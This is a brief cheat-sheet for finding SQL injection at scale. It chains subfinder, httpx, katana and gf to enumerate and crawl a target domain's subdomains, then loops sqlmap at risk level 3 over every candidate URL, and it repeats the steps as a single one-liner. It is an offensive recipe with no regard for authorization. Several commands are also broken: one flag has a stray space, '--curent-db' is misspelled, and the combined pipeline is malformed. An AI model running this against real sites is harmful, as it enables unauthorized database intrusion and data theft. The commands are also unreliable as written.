# SQLi

### Find SQLi at scale

`# collect target urls`\
``\
`subfinder -d site.com -silent - all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a urls`\
``\
`# filter potential SQLi Url`\
`cat urls | gf sqli | tee -a sqli`\
``\
`# run test`\
`while read line; do sqlmap -u $line --parse-errors --curent-db --invalid-logical --invalid-bignum --invalid-string --risk 3; done < sqli`

```
subfinder -d site.com -silent - all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a urls | cat urls | gf sqli | tee -a sqli | while read line; do sqlmap -u $line --parse-errors --curent-db --invalid-logical --invalid-bignum --invalid-string --risk 3; done < sqli
```
